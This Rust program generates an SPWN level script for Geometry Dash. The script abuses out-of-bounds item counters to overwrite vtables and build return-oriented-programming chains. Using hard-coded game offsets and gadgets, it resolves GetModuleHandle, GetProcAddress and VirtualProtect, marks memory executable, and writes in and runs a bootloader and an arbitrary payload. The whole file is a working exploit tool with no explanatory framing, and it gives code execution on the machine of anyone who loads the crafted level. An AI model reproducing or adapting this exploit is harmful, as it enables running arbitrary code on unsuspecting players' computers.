use std::io::Write;
use std::fs::{File, self};

const GROUP_ARR_OFFSET: i32 = 0x27c;
const SCALE_OFFSET: i32 = 40;

const COCOS_SCHEM_OFFSET: i32 = 0x86C52;

const SCRATCH: i32 = 0x31E08C + 4; // + 4 due to data2 vtable manips

const CCIMEDELEGATE_CTOR: i32 = 0x282750;
const CCIMEDELEGATE_VTABLE: i32 = 0x12FCFC;

const CCCALLFUNCND_EXECUTE: i32 = 0x86C40;
const CCCALLFUNCND_EXECUTE_PTR: i32 = 0x11F960;

const CCNODE_SETSCALE_STUB: i32 = 0x261896;

// pop eax; ret
const POP_EAX_GADGET: i32 = 0x3e370;

// pop ecx; ret
const POP_ECX_GADGET: i32 = 0x109a;

// add esp, 4; pop edi; ret
//const POP_EDI_GADGET: i32 = 0x86920;

// pop edi; pop esi; pop ebx; ret
const NORM_GADGET: i32 = 0x12aef;

// mov [ecx+0x110], eax; ret
const WRITE_EAX_GADGET: i32 = 0x43007;

// add dword ptr [ecx], eax; ret 4
const ADD_ECX_EAX_4_GADGET: i32 = 0xe5d37;

// mov eax, [ecx]; call [eax]
const CALL_VTABLE_GADGET: i32 = 0x214A34;

const GETMODULEHANDLE_PTR: i32 = 0x11D090;
const GETPROCADDRESS_PTR: i32 = 0x11D0E8;

pub struct Counter<'a> {
	pub item: i32,
	pub name: &'a str,
	pub stream: &'a File,
	pub current_value: i32,
	pub added: i32,
}

impl<'a> Counter<'a> {
	pub fn new(item: i32, name: &'a str, mut stream: &'a File) -> Self {
		write!(stream, "let {name} = counter(@item({item}))\n{name}.reset()\n").unwrap();
		Self { item, name, stream, current_value: 0, added: 0, }
	}

	pub fn no_reset(item: i32, name: &'a str, mut stream: &'a File) -> Self {
		write!(stream, "let {name} = counter(@item({item}))\n").unwrap();
		Self { item, name, stream, current_value: 0, added: 0, }
	}

	pub fn add(&mut self, n: i32) {
		self.added += n;
		self.current_value += n;
	}

	pub fn set(&mut self, n: i32) {
		self.add(n - self.current_value);
	}

	pub fn flush(&mut self) {
		if self.added == 0 { return; }
		write!(self.stream, "{} += {}\n", self.name, self.added).unwrap();
		self.added = 0;
	}

	pub fn add_now(&mut self, n: i32) {
		self.add(n);
		self.flush();
	}

	pub fn set_now(&mut self, n: i32) {
		self.set(n);
		self.flush();
	}

	pub fn offset(&mut self, c: &mut Self) {
		c.flush();
		self.current_value += c.current_value;
		write!(self.stream, "{} += {}\n", self.name, c.name).unwrap();
	}

	pub fn offset_to(&mut self, c: &mut [&mut Self]) {
		if c.len() == 0 { return; }
		let mut st = String::from(c[0].name);
		c[0].current_value += self.current_value;
		for x in &mut c[1..] {
			st.push(',');
			st.push_str(x.name);
			x.current_value += self.current_value;
		}
		self.flush();
		write!(self.stream, "{}.copy_to([{}])\n", self.name, st).unwrap();
	}

	pub fn dynamic_reset(&mut self) {
		self.added = 0;
		write!(self.stream, "{}.reset()\n", self.name).unwrap();
	}
}

#[derive(Clone, Copy)]
pub struct MaybeRel {
	pub value: i32,
	pub rel: bool,
}

impl MaybeRel {
	pub fn imm(value: i32) -> Self {
		Self { value, rel: false }
	}

	pub fn rel(value: i32) -> Self {
		Self { value, rel: true }
	}
}

pub fn frame(mut s: &File) {
	write!(s, "let cur = wait_frame(cur)\n").unwrap();
}

const CF_CALLFUNC: i32 = 0x3C;
const CF_THIS: i32 = 0x34;
const CF_DATA1: i32 = 0x24;
const CF_DATA2: i32 = 0x44;
const CF_SIZE: i32 = 0x48;

pub fn make_callfunc(this: &mut Counter, data1: &mut Counter, data2: &mut Counter, cf_callfunc: MaybeRel, cf_this: MaybeRel, cf_data1: MaybeRel, cf_data2: MaybeRel) {
	let mut s = this.stream;
	
	let base = this.current_value;
	
	write!(s, "\n// callfunc at {:#X}\n", base).unwrap();

	// data1
	this.set(base + CF_DATA1);
	if cf_data1.rel {
		this.add(-4);
		data2.set_now(cf_data1.value);
	} else {
		data1.set_now(cf_data1.value);
	}
	this.flush();
	frame(s);

	// this
	this.set(base + CF_THIS);
	if cf_this.rel {
		this.add(-4);
		data2.set_now(cf_this.value);
	} else {
		data1.set_now(cf_this.value);
	}
	this.flush();
	frame(s);

	// callfunc
	this.set(base + CF_CALLFUNC);
	if cf_callfunc.rel {
		this.add(-4);
		data2.set_now(cf_callfunc.value);
	} else {
		data1.set_now(cf_callfunc.value);
	}
	this.flush();
	frame(s);

	// data2
	this.set(base + CF_DATA2);
	if cf_data2.rel {
		this.add(-4);
		data2.set_now(cf_data2.value);
	} else {
		data1.set_now(cf_data2.value);
	}
	this.flush();
	frame(s);

	this.set(base + CF_SIZE); // set this to the base + size for convenience
}

pub fn schem(schems: &mut Vec<i32>, i: i32, offset: i32) -> i32 {
	schems.push(i);
	offset - COCOS_SCHEM_OFFSET
}

#[derive(Debug, Clone, Copy)]
pub enum RelType { None, GD, Cocos }

#[derive(Debug, Clone, Copy)]
pub struct AnyRel {
	pub value: i32,
	pub rel: RelType,
}

impl AnyRel {
	pub fn none(value: i32) -> Self {
		Self { value, rel: RelType::None }
	}

	pub fn gd(value: i32) -> Self {
		Self { value, rel: RelType::GD }
	}

	pub fn cc(value: i32) -> Self {
		Self { value, rel: RelType::Cocos }
	}

	pub fn to_schem(self) -> MaybeRel {
		match self.rel {
			RelType::None => MaybeRel::imm(self.value),
			RelType::GD => MaybeRel::rel(self.value),
			RelType::Cocos => MaybeRel::imm(self.value - COCOS_SCHEM_OFFSET)
		}
	}

	pub fn to_schem_with_vec(self, i: i32, schems: &mut Vec<i32>) -> MaybeRel {
		match self.rel {
			RelType::None => MaybeRel::imm(self.value),
			RelType::GD => MaybeRel::rel(self.value),
			RelType::Cocos => MaybeRel::imm(schem(schems, i, self.value))
		}
	}
}

pub fn make_callfunc_any(schems: &mut Vec<i32>, this: &mut Counter, data1: &mut Counter, data2: &mut Counter, cf_callfunc: AnyRel, cf_this: AnyRel, cf_data1: AnyRel, cf_data2: AnyRel) {
	let new_cf_data1 = cf_data1.to_schem_with_vec(this.current_value + CF_DATA1, schems);
	let new_cf_this = cf_this.to_schem_with_vec(this.current_value + CF_THIS, schems);
	let new_cf_callfunc = cf_callfunc.to_schem_with_vec(this.current_value + CF_CALLFUNC, schems);
	let new_cf_data2 = cf_data2.to_schem_with_vec(this.current_value + CF_DATA2, schems);
	make_callfunc(
		this, data1, data2,
		new_cf_callfunc, new_cf_this, new_cf_data1, new_cf_data2
	);
}

pub fn make_rop_callfunc(
	schems: &mut Vec<i32>,
	this: &mut Counter, data1: &mut Counter, data2: &mut Counter,
	items: &[AnyRel],
	ecx: AnyRel, jmp: AnyRel,
) {
	assert!(items.len() > 0);
	for item in &items[..(items.len() - 1)] {
		// CCCallFuncND::execute will execute the ret instruction (nop)
		// return with data1 at the top of the stack (recursing),
		// leaving data2 newly pushed
		make_callfunc_any(
			schems, this, data1, data2,
			// first ret instruction i found
			AnyRel::gd(0x109B),
			AnyRel::gd(this.current_value + CF_SIZE + SCALE_OFFSET),
			AnyRel::cc(CCCALLFUNCND_EXECUTE),
			*item
		);
	}
	// executes ret (nop)
	// return with data1 on the stack (jmp)
	// pushes the last item onto the stack
	make_callfunc_any(
		schems, this, data1, data2,
		AnyRel::gd(0x109B),
		ecx,
		jmp,
		items[items.len() - 1]
	);
}

pub fn make_rop_callfunc_multi(
	schems: &mut Vec<i32>, this: &mut Counter, data1: &mut Counter, data2: &mut Counter,
	rops: &[(&[fn(&[i32], i32) -> AnyRel], AnyRel, AnyRel, i32)]
) -> Vec<i32> {
	let mut indices = Vec::new();
	let mut idx = this.current_value + SCALE_OFFSET;
	for items in rops {
		indices.push(idx);
		idx += items.0.len() as i32 * CF_SIZE;
	}
	indices.push(idx); // push index past last rop for convenience
	for (items, ecx, jmp) in rops.iter().map(|f| {
		(f.0.iter().map(|g| g(&indices, f.3)).collect::<Vec<_>>(), f.1, f.2)
	}) {
		make_rop_callfunc(schems, this, data1, data2, &items, ecx, jmp);
	}
	indices
}

fn main() {
	let file = File::create("./main.spwn").unwrap();
	let bootloader = fs::read("./bootloader.bin").unwrap();
	let payload = fs::read("./payload.bin").unwrap();
	let mut s = &file;
	write!(s, "{}", fs::read_to_string("./prelude.spwn").unwrap()).unwrap();
	/*// m_nGroupValues offset = 0x9F0 (index 0x27C)
// 0x0 - 0x27C = -0x27C
vtable = counter(@item(-636))
// 0xF - 0x27C = -0x26D
callfunc = counter(@item(-621))
// 0x9 - 0x27C = -0x273
data1 = counter(@item(-627))
// 0x11 - 0x27C = -0x26B
data2 = counter(@item(-619))
// 0xD - 0x27C = -0x26F
this = counter(@item(-623)) */
	let mut schems = Vec::new();

	let mut vtable = Counter::no_reset(0 - GROUP_ARR_OFFSET, "vtable", s);
	vtable.current_value = 0x2A5FC4; // GJEffectManager vtable offset

	let mut callfunc = Counter::new(0xF - GROUP_ARR_OFFSET, "callfunc", s);
	let mut data1 = Counter::new(0x9 - GROUP_ARR_OFFSET, "data1", s);
	let mut data2 = Counter::new(0x11 - GROUP_ARR_OFFSET, "data2", s);
	let mut this = Counter::new(0xD - GROUP_ARR_OFFSET, "this", s);
	
	vtable.offset_to(&mut [&mut callfunc, &mut this, &mut data2]);

	this.set(SCRATCH - SCALE_OFFSET);

	write!(s, "let cur = wait_frame(60)\n").unwrap();

	vtable.set(CCIMEDELEGATE_CTOR);
	vtable.add(-0x16C); // CCNode::visit offset in vtable
	vtable.flush();

	frame(s); // wait for CCIMEDelegate::CCIMEDelegate to set vtable

	vtable.current_value = CCIMEDELEGATE_VTABLE;

	vtable.set(CCCALLFUNCND_EXECUTE_PTR);
	vtable.add_now(-0x16C);
	callfunc.set_now(CCNODE_SETSCALE_STUB);

	this.flush();
	data1.set_now(schem(&mut schems, this.current_value, CCCALLFUNCND_EXECUTE_PTR)); // TODO: merge with above?
	frame(s);

	this.add(4);

	let virtualprotect = this.current_value + SCALE_OFFSET;

	this.add(-1); // set it 1 behind because we increment before setting
	// no null terminator needed: data1 ends with many zeroes
	for b in b"VirtualProtect" {
		this.add_now(1);
		data1.set_now(*b as i32);
		frame(s);
	}
	this.add_now(3); // we're at the t, move one more to pass it and 2 more for alignment
	
	let gmh_ptr_addr = this.current_value + SCALE_OFFSET;
	data1.set_now(schem(&mut schems, this.current_value, GETMODULEHANDLE_PTR));
	frame(s);
	this.add_now(4);
	let gpa_ptr_addr = this.current_value + SCALE_OFFSET;
	data1.set_now(schem(&mut schems, this.current_value, GETPROCADDRESS_PTR));
	frame(s);

	// nothing special about the CF_SIZE + 4 here, it just happens to be
	// a convenient empty space where we can put stuff. i couldve also
	// done + 0x1000 or something 
	this.set(SCRATCH + CF_SIZE + 4 - SCALE_OFFSET);

	let kernel32 = this.current_value + SCALE_OFFSET;

	this.add(-2); // 2 before because we add 2
	// no null terminator needed
	for b in b"kernel32" {
		this.add_now(2);
		data1.set_now(*b as i32);
		frame(s);
	}

	this.set(SCRATCH - SCALE_OFFSET); // go back to beginning of scratch space

	let chains = make_rop_callfunc_multi(&mut schems,
		&mut this, &mut data1, &mut data2,
		&[
			(
				&[
					// pop ecx gadget
					|_, _| AnyRel::cc(CCCALLFUNCND_EXECUTE), // ret
					|c, _| AnyRel::gd(c[1]), // ecx 
					// write eax gadget
					|_, _| AnyRel::gd(POP_ECX_GADGET), // ret
					// pop ecx gadget
					|_, _| AnyRel::gd(WRITE_EAX_GADGET), // ret
					|c, _| AnyRel::gd(c[2] - CF_SIZE + CF_DATA2 - 0x110), // ecx
					// indirect call gadget
					|_, _| AnyRel::gd(0), // arbitrary value for ret 4 in gadget to pop
					|_, _| AnyRel::gd(POP_ECX_GADGET), // ret
					// GetModuleHandle
					|_, k| AnyRel::gd(k), // module
				],
				AnyRel::gd(gmh_ptr_addr),
				AnyRel::gd(CALL_VTABLE_GADGET), // indirect call
				kernel32
			),
			(
				&[
					// pop ecx gadget
					|_, _| AnyRel::cc(CCCALLFUNCND_EXECUTE), // ret
					|c, _| AnyRel::gd(c[2]), // ecx
					// write eax gadget
					|_, _| AnyRel::gd(POP_ECX_GADGET), // ret
					// pop ecx gadget
					|_, _| AnyRel::gd(WRITE_EAX_GADGET), // ret
					|c, _| AnyRel::gd(c[3] - CF_SIZE + CF_DATA1 - 0x110), // ecx, write to data1 because we want to override jump
					// indirect call gadget
					|_, _| AnyRel::gd(0), // arbitrary value for ret 4 in gadget to pop
					|_, _| AnyRel::gd(POP_ECX_GADGET), // ret
					// GetProcAddress
					|_, k| AnyRel::gd(k), // name
					|_, _| AnyRel::gd(0), // handle (arbitrary, gets set)
				],
				AnyRel::gd(gpa_ptr_addr),
				AnyRel::gd(CALL_VTABLE_GADGET),
				virtualprotect
			),
			(
				&[
					// VirtualProtect
					|_, _| AnyRel::gd(SCRATCH), // old protect (dontcare but must be valid)
					|_, _| AnyRel::none(0x40), // new protect
					|_, k| AnyRel::none(k), // size
					|c, _| AnyRel::gd(c[3]), // address
					|c, _| AnyRel::gd(c[3]), // ret
				],
				AnyRel::gd(0), // ecx doesn't matter
				AnyRel::gd(0), // jump target will be overriden by previous rops
				bootloader.len() as i32
			),
		]
	);
	dbg!(&chains);
	dbg!(this.current_value);
	this.add(-1);
	for b in bootloader {
		this.add_now(1);
		data1.set_now(b as i32);
		frame(s);
	}

	data1.set(0);
	data1.offset(&mut data2);
	data1.set_now(ADD_ECX_EAX_4_GADGET);	
	data2.set_now(NORM_GADGET);
	callfunc.set_now(POP_EAX_GADGET);
	for schem in schems {
		this.set_now(dbg!(schem + SCALE_OFFSET));
		frame(s);
	}

	this.set_now(chains[0]);
	callfunc.set_now(CALL_VTABLE_GADGET);
	frame(s);

	callfunc.dynamic_reset();
	for (i, chunk) in payload.chunks(4).enumerate() {
		let mut arr = [0xcc; 4];
		arr[..chunk.len()].copy_from_slice(chunk);
		let n = i32::from_le_bytes(arr);
		write!(s, "@item({}).add({})\n", -(i as i32) - 0x1000, n).unwrap();
	}
	write!(s, "@item({}).add(1)\n", -0xfffi32).unwrap();
}
